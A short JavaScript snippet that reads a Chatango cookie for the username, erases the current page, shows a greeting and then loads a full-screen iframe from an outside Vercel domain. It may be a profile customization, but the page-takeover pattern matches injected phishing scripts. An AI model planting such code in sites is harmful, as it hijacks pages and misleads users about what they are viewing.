window.addEventListener("DOMContentLoaded", () => {
  // Ambil nama user dari cookie Chatango
  function rand(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
  }

  let name;
  let cookie = document.cookie;

  try {
    let found = cookie.match(/id\.chatango\.com=([^;]+)/);
    let user = found ? found[1] : null;
    name = user.charAt(0).toUpperCase() + user.slice(1);
  } catch {
    name = "Anon" + rand(1000, 9999);
  }

  // Simpan ke history (opsional)
  let history = JSON.parse(localStorage.getItem("history")) || [];
  history.push({ username: name, timestamp: new Date().toISOString() });
  localStorage.setItem("history", JSON.stringify(history));

  // Bersihkan seluruh isi halaman
  document.head.innerHTML = "";
  document.body.innerHTML = "";
  document.body.style.margin = "0";
  document.body.style.padding = "0";
  document.body.style.background = "#fff";

  // Tampilkan pesan di tengah halaman
  const message = document.createElement("div");
  message.textContent = `Hello, ${name}, page will change in 5 second`;
  message.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-family: Arial, sans-serif;
    font-size: 20px;
    color: #333;
    border: 2px solid #f59e0b;
    padding: 20px 30px;
    background: #fef3c7;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
  `;
  document.body.appendChild(message);

  // Setelah 5 detik, tampilkan iframe
  setTimeout(() => {
    document.body.innerHTML = ""; // Hapus pesan
    const iframe = document.createElement("iframe");
    iframe.src = "https://chatango-profile-dusky.vercel.app/";
    iframe.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    `;
    document.body.appendChild(iframe);
  }, 5000);
});
